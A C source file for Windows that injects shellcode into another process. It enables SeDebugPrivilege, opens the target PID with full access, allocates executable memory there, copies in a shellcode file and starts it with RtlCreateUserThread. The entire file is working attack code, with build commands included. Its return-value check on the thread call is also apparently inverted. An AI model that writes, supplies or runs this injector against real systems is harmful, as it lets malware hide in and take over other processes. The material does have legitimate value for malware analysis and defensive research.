#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "advapi32.lib")

/*
  cl /c shellcode_inject.c
  link /out:shellcode_inject.exe shellcode_inject.obj advapi32.lib
*/

#define DWORD unsigned long
#define SHELLCODE_SIZE 1024*1024

typedef int (*RTLCREATEUSERTHREAD_PTR)(HANDLE,int,int,int,int,int,LPVOID,LPVOID,int,LPWORD *, int);


char *GetError()
{
      char *errstr;
      char *errcode=malloc(4);
      memset(errcode,0,4);
      sprintf(errcode,"%x",GetLastError());
      FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM,0,GetLastError(),MAKELANGID(LANG_ENGLISH,SUBLANG_ENGLISH_US),&errstr,10,0);
      char *str=malloc(strlen(errstr)+strlen(errcode)+4);
      strcpy(str,errstr);
      strcat(str,"errno 0x");
      strcat(str,errcode);
      return str;   
}
void get_privileges()
{
     HANDLE hProcessToken;
     LUID luid;
     TOKEN_PRIVILEGES priv;
     OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
     LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);
     priv.PrivilegeCount = 1;
     priv.Privileges[0].Luid = luid;
     priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     AdjustTokenPrivileges( hProcessToken, FALSE, &priv, sizeof(TOKEN_PRIVILEGES), 0, 0 );
}
int main( int argc, char *argv[] )
{
    FILE * f;
    void * buf;
    int PID;
    HANDLE hprocess;
    LONGLONG addr_exec;
    LPWORD threadId;
    int i;

    if(argc!=3)
    {
      printf("%s PID shellcode.bin\n",argv[0]);
      return -1;
    }
    
    f = fopen( argv[2], "rb" );
    buf = malloc(SHELLCODE_SIZE);
    memset(buf, '\0', SHELLCODE_SIZE);
    fread(buf, 1, SHELLCODE_SIZE, f);
    fclose(f);


    PID=atoi(argv[1]);
    get_privileges();
    
    if(hprocess = OpenProcess(PROCESS_ALL_ACCESS,0,PID))
      printf("process %i opening with all access\n",PID);
    else
    {
      printf("OpenProcess: %s\n",GetError());
      return -1;
    }
        
    if(addr_exec = VirtualAllocEx(hprocess, 0, SHELLCODE_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE))
      printf("allocation [0x%016X] created\n", addr_exec);
    else
    {
      printf("VirtualAllocEx: %s",GetError());
      return -1;
    }
    
    if( WriteProcessMemory(hprocess, addr_exec, buf, SHELLCODE_SIZE, 0) )
      printf("shellcode written\n");
    else 
    {
      printf("WriteProcessMemory: %s",GetError());
      return -1;
    }

    //printf("press any key to run remote thread..."); getchar();   
    RTLCREATEUSERTHREAD_PTR RtlCreateUserThread_ptr = (RTLCREATEUSERTHREAD_PTR)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
    if(RtlCreateUserThread_ptr(hprocess, 0,0,0,0,0, addr_exec, 0,0, &threadId, 0))
    //if(CreateRemoteThread(hprocess, 0,0, addr_exec, 0,0, &threadId))
      printf("remote thread created [0x%X] in %i\n",threadId,PID);  
    else
    {
      printf("CreateRemoteThread: %s",GetError());
      return -1;
    }

    return 0;
}
